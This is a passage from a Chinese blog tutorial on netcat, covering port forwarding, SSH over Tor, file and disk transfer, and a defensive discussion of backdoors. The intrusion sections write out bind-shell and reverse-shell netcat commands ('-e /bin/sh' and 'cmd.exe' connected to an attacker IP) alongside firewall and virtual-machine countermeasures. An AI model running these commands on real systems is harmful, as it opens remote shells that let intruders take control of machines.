　　关于【端口转发】的相关概念，有啥用处和好处，那篇都已经写了。这里就不再重复唠叨啦。<br/>
　　在当年那篇教程中，俺主要聊了两个工具，分别是是 rinetd 和 netsh。当年为啥没有介绍 netcat 捏？因为 nc 的功能太强，所谓“杀鸡焉用牛刀”。相比之下，rinetd 的使用非常简单，而 netsh 是 Windows 内置滴工具。<br/>
　　今天就把当年没聊的给补一下——如何用 nc 玩“端口转发”。<br/>
<br/>
<h3>◇原理</h3><br/>
　　用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br/>
　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 <code>|</code>），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br/>
　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br/>
　　主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。<br/>
<br/>
<h3>◇方法</h3><br/>
　　<b>步骤1：创建命名管道</b><br/>
　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 <code>nc_pipe</code>。（俺用这个名称只是为了举例，你也可以用别的名称）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">mkfifo nc_pipe</pre><br/>
　　<b>步骤2：同时启动两个 nc</b><br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe</pre>　　运行上述命令之后，就可以把本机的 <code>1235</code> 端口重定向到本机的 <code>5678</code> 端口。<br/>
<br/>
　　这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br/>
　　如果你比较喜欢刨根问底，俺稍微解释一下：<br/>
　　上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 <code>nc_pipe</code> 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。<br/>
<br/>
<h3>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><br/>
　　参见“招数2”章节中的“补充说明”。<br/>
<br/>
<a name="tricks8"> </a><br/>
<h2>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）</h2><br/>
<h3>◇使用场景</h3><br/>
　　提醒一下：<br/>
　　【不要混淆】本章节与“招数4”。<br/>
　　“招数4”聊的是——nc 自己通过代理进行网络访问（nc over Tor）。<br/>
　　“本章节”聊的是——nc 帮助其它网络软件走代理进行网络访问（XX软件 over nc over Tor）。<br/>
<br/>
　　比如说，SSH 是很常用的一个安全工具——用来远程操作服务器。<br/>
　　在某些特殊场合，俺想要通过 SSH 登录某个服务器，但是又【不希望】服务器记录俺本人【真实的】“公网 IP”（“暴露【真实的】公网 IP”等同于“暴露真实身份”）<br/>
　　说到这里，很多老读者肯定猜到俺说啥——让 SSH 走 Tor 代理（SSH over Tor）。<br/>
　　但可惜的是：（POSIX 系统中常用的）OpenSSH 客户端【不支持】SOCKS 代理，而 Tor 默认提供的是 SOCKS 代理。这时候，netcat 就派上用场啦——用 nc 把 SSH 的数据流转发到 Tor 的 SOCKS 代理。<br/>
<br/>
<h3>◇方法</h3><br/>
　　2016年开两会的时候，俺在 Github 上开源【太子党关系网络】。之后，专门写了一篇教程（如下），介绍如何【隐匿地】访问 Github 仓库。<br/>
《<a href="../../2016/03/GitHub-Security-Tips.md">使用 GitHub 的几种方式——兼谈安全性和隐匿性的经验</a>》<br/>
　　由于 Github 同时提供了几种不同的访问途径（Web、Git、SSH）。对【每一种】Github 的访问方式，俺都介绍了相应的隐匿措施。<br/>
　　对 SSH 这种访问方式，当时俺介绍的招数就是——用 nc 进行代理转发（把 SSH 的数据流转发到 Tor）<br/>
　　既然当年已经聊过了，这里就不重复唠叨啦。对这招感兴趣的同学，请猛击上述链接。<br/>
<br/>
<h3>◇补充说明：“SSH over Tor”与“Tor over SSH”</h3><br/>
　　即使懂技术的同学，有时候也会混淆这两者。俺顺便澄清一下：<br/>
　　<b>Tor over SSH</b><br/>
　　这种方式相当于 SSH 作为 Tor 的前置代理。假设你有一个墙外的 SSH server，而且没有被 GFW 屏蔽，就可以用这招，让你的 Tor 客户端通过这个 SSH server 联网。<br/>
　　<b>SSH over Tor</b><br/>
　　这是让 SSH 通过 Tor 网络（暗网）连接到 SSH 服务器，从而隐藏 SSH 客户端的【真实】公网 IP。在这种情况下，SSH 服务器看到的访问者 IP 是“Tor 出口节点的公网 IP”。<br/>
<br/>
<a name="tricks9"> </a><br/>
<h2>★招数9：（系统管理）用 nc 传输文件</h2><br/>
<h3>◇使用场景</h3><br/>
　　有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br/>
　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br/>
　　反驳的理由很多——<br/>
反驳1：这个玩意儿只能在 Windows 上用。<br/>
反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br/>
反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br/>
......<br/>
　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br/>
　　俺觉得：<br/>
1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br/>
2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。<br/>
<br/>
<h3>◇方法</h3><br/>
　　为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2<br/>
<br/>
　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -l -p xxx &gt; file2</pre><br/>
　　然后在【发送端】（A 主机）运行如下命令。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc x.x.x.x xxx &lt; file1</pre>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。<br/>
<br/>
<h3>◇补充说明：nc 的性能优势</h3><br/>
　　用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br/>
　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br/>
　　如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录...”而言）<br/>
<br/>
<a name="tricks10"> </a><br/>
<h2>★招数10：（系统管理）用 nc 远程备份整个磁盘</h2><br/>
<h3>◇使用场景</h3><br/>
　　当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br/>
　　无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。<br/>
<br/>
　　考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br/>
　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br/>
　　<b>性能差异</b>——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br/>
　　<b>完整性差异</b>——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br/>
　　一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。<br/>
<br/>
<h3>◇原理</h3><br/>
　　为了传输整个磁盘，你需要用到 <code>dd</code> 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br/>
　　俺曾经在如下博文中稍微介绍过 <code>dd</code> 命令的使用。<br/>
《<a href="../../2013/12/create-bootable-usb-stick-from-iso.md">如何用 ISO 镜像制作 U 盘安装盘（通用方法、无需 WinPE）</a>》<br/>
　　关于 <code>dd</code> 命令的更详细介绍，可以参见“维基百科”（<a href="https://en.wikipedia.org/wiki/Dd_(Unix)" rel="nofollow" target="_blank">这里</a>）或“Gnu 官网”（<a href="https://www.gnu.org/software/coreutils/dd" rel="nofollow" target="_blank">这里</a>）。<br/>
<br/>
　　通过 <code>dd</code> 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br/>
　　在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 <code>dd</code> 命令的输出保存成文件，而是把 <code>dd</code> 的输出通过管道符（<code>|</code>）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。<br/>
<br/>
<h3>◇方法</h3><br/>
　　由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br/>
　　假设你要把 A 主机 <code>/dev/sda</code> 磁盘的【原始数据】整个复制到 B 主机的 <code>/dev/sdb</code> 磁盘。<br/>
<br/>
　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -l -p xxx | dd of=/dev/sdb</pre><br/>
　　然后在【发送端】（A 主机）运行如下命令。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">dd if=/dev/sda | nc x.x.x.x xxx</pre>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。<br/>
<br/>
<h3>◇补充说明：nc 的性能优势</h3><br/>
　　如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br/>
　　（具体的原因，前一个章节已经分析过了）<br/>
<br/>
<a name="tricks11"> </a><br/>
<h2>★招数11：（入侵手法）用 nc 开启【被动】连接型后门</h2><br/>
　　既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br/>
　　做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。<br/>
<br/>
<h3>◇使用场景</h3><br/>
　　假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br/>
　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br/>
　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br/>
　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br/>
　　在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。<br/>
<br/>
<h3>◇原理</h3><br/>
　　为了让后门能工作，通常会使用 nc 的 <code>-e</code> 选项，该选项的“选项值”是一个可执行文件的路径。<br/>
　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br/>
　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 <code>cmd.exe</code>；对 POSIX 系统（Linux or UNIX）而言，就是 <code>/bin/sh</code><br/>
　　在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。<br/>
<br/>
<h3>◇入侵方法</h3><br/>
　　<b>步骤1</b><br/>
　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 <code>xxx</code> 是端口号）<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc.exe -l -p xxx -e cmd.exe</pre>　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -l -p xxx -e /bin/sh</pre><br/>
　　<b>步骤2</b><br/>
　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。<br/>
<br/>
<h3>◇补充说明：<code>-e</code> 选项</h3><br/>
　　据说是考虑到 <code>-e</code> 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br/>
　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。<br/>
<br/>
<h3>◇【不够】靠谱的防范措施</h3><br/>
　　在这个场景中，大伙儿可能会想到三个值得改进之处：<br/>
1、浏览器的漏洞<br/>
2、使用公共 wifi 热点的习惯<br/>
3、防火墙的设置<br/>
<br/>
　　对第1点<br/>
　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；<br/>
<br/>
　　对第2点<br/>
　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。<br/>
<br/>
　　对第3点<br/>
　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br/>
　　但是！（俺要开始说【但是】了）<br/>
　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br/>
比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br/>
再比如说：直接把防火墙的过滤模块干掉；<br/>
更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）<br/>
<br/>
<h3>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</h3><br/>
　　首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《<a href="../../2012/10/system-vm-0.md">扫盲操作系统虚拟机</a>》系列教程。<br/>
<br/>
　　要想用这招，步骤如下：<br/>
1、当然先要安装【虚拟化软件】（VBox、VMware ...），<br/>
2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br/>
3、虚拟系统的网卡设置为【NAT】模式<br/>
<br/>
　　完成上述步骤后，你就可以在这个虚拟系统中上网。<br/>
　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br/>
　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。<br/>
<br/>
<h3>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</h3><br/>
　　上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br/>
　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。<br/>
<br/>
<a name="tricks12"> </a><br/>
<h2>★招数12：（入侵手法）用 nc 开启【主动】连接型后门</h2><br/>
<h3>◇使用场景</h3><br/>
　　为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。<br/>
　　可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。<br/>
　　虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。<br/>
<br/>
<h3>◇原理</h3><br/>
　　原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。<br/>
<br/>
<h3>◇入侵方法</h3><br/>
　　<b>步骤1</b><br/>
　　既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 <code>xxx</code> 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 <code>xxx</code> 端口号对外监听。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -lk -p xxx</pre><br/>
　　<b>步骤2</b><br/>
　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc.exe -e cmd.exe x.x.x.x xxx</pre>　　如果受害者是 POSIX 系统，则用如下命令：<br/>
<pre class="shell" style="background-color:Black;color:LawnGreen;">nc -e /bin/sh x.x.x.x xxx</pre>　　（在上述两个命令中， <code>xxx</code> 是步骤1用到的端口号，<code>x.x.x.x</code> 是攻击者的 IP 地址）<br/>
<br/>
<h3>◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</h3><br/>
　　所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。<br/>
　　早在6年前（2013），俺就已经聊过【虚拟机隔离】的话题。具体参见如下系列教程的“第6篇、第7篇、第8篇”：<br/>
《<a href="../../2010/04/howto-cover-your-tracks-0.md">如何隐藏你的踪迹，避免跨省追捕</a>》<br/>
　　虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。<br/>
<br/>
　　有必要提醒一下：<br/>
　　【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。<br/>
　　只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。<br/>
　　这下该咋办捏？<br/>
　　（在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。<br/>
　　如果你对安全性的要求【非常高】，要学会：<br/>
1、用“快照功能”建立【安全基线】<br/>
（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）<br/>
2、养成【定期回退快照】的好习惯<br/>
（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦）<br/>
　　关于这方面的教程，俺专门写过一篇：<br/>
《<a href="../../2015/12/system-vm-7.md">扫盲操作系统虚拟机[7]：如何用“快照”辅助安全加固、强化隐私保护？</a>》<br/>
<br/>
<h3>◇“【主动】连接型后门”的优势之处（危险性之处）</h3><br/>
　　简单对比一下“后门的两种连接方式”。<br/>
<br/>
　　<b>可用性</b><br/>
　　如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。<br/>
　　相比之下，“主动型后门”就【没有】这种弊端。<br/>
<br/>
　　<b>隐蔽性</b><br/>
　　“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。<br/>
　　相比之下，“主动型后门”就【没有】这个问题。<br/>
<br/>
<a name="variants"> </a><br/>
<h2>★附录：netcat 的【其它变种】</h2><br/>
　　本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。<br/>
<br/>
<h3>◇GNU netcat</h3><br/>
　　官网在“<a href="http://netcat.sourceforge.net/" rel="nofollow" target="_blank">这里</a>”。<br/>
　　从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。<br/>
　　按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本）<br/>
<br/>
<h3>◇ncat</h3><br/>
　　这是 nmap 社区重写的 nc，其官网页面在“<a href="https://nmap.org/ncat/" rel="nofollow" target="_blank">这里</a>”，帮助页面在“<a href="https://nmap.org/ncat/guide/" rel="nofollow" target="_blank">这里</a>”。<br/>
　　它的口号是：<q style="background-color:#DDD;">Ncat - Netcat for the 21st Century</q><br/>
　　与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。<br/>
　　由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap）<br/>
<br/>
<h3>◇socat</h3><br/>
　　在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。<br/>
　　很多主流的 Linux 发行版已经包含它。<br/>
　　他也完全支持 SSL/TLS。<br/>
<br/>
<h3>◇Cryptcat</h3><br/>
　　一看名称就能猜到：这是“加密的网猫”。<br/>
　　由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。<br/>
　　这款变种在传输过程中用 twofish 算法加密，以规避嗅探。<br/>
<br/>
<h3>◇sbd</h3><br/>
　　光看这3字母的名称，你可能不知道这款变种的特色。<br/>
　　但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。<br/>
　　它的加密采用“AES-128-CBC + HMAC-SHA1”。<br/>
<br/>
<h3>◇netrw</h3><br/>
　　这是专门针对“文件传输”功能进行强化和简化的变种。<br/>
　　【简化】方面<br/>
　　它分成两个命令：<code>netread</code> 和 <code>netwrite</code>，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。<br/>
　　【强化】方面<br/>
　　它会对传输过程进行散列校验，以防止传输的数据被篡改。<br/>
<br/>
<br/>
<b>俺博客上，和本文相关的帖子（需翻墙）</b>：<br/>
《<a href="../../2019/11/POSIX-TUI-from-TTY-to-Shell-Programming.md">扫盲 Linux＆UNIX 命令行——从“电传打字机”聊到“shell 脚本编程”</a>》<br/>
《<a href="../../2019/01/Security-Guide-for-Political-Activists.md">为啥朝廷总抓不到俺——十年反党活动的安全经验汇总</a>》<br/>
《<a href="../../2010/04/howto-cover-your-tracks-0.md">如何隐藏你的踪迹，避免跨省追捕</a>》（系列）<br/>
《<a href="../../2010/06/howto-prevent-hacker-attack-0.md">如何防止黑客入侵</a>》（系列）<br/>
《<a href="../../2013/06/privacy-protection-0.md">如何保护隐私</a>》（系列）<br/>
《<a href="../../2013/11/tor-faq.md">关于 Tor 的常见问题解答</a>》<br/>
《<a href="../../2013/01/cross-host-use-gfw-tool.md">多台电脑如何【共享】翻墙通道——兼谈【端口转发】的几种方法</a>》<br/>
《<a href="../../2019/04/Proxy-Tricks.md">如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）</a>》<br/>
《<a href="../../2014/12/gfw-privoxy.md">如何用 Privoxy 辅助翻墙？</a>》<br/>
《<a href="../../2012/10/system-vm-0.md">扫盲操作系统虚拟机</a>》（系列）<br/>
《<a href="../../2016/08/Trojan-Horse-DCM.md">如何对付公安部门的“网络临侦”？——“黑暗幽灵（DCM）木马”之随想</a>》<br/>
《<a href="../../2016/03/GitHub-Security-Tips.md">使用 GitHub 的几种方式——兼谈安全性和隐匿性的经验</a>》
</div>


------------------------------------------------

版权声明本博客所有的原创文章，作者皆保留版权。转载必须包含本声明，保持本文完整，并以超链接形式注明作者编程随想和本文原始地址：https://program-think.blogspot.com/2019/09/Netcat-Tricks.html
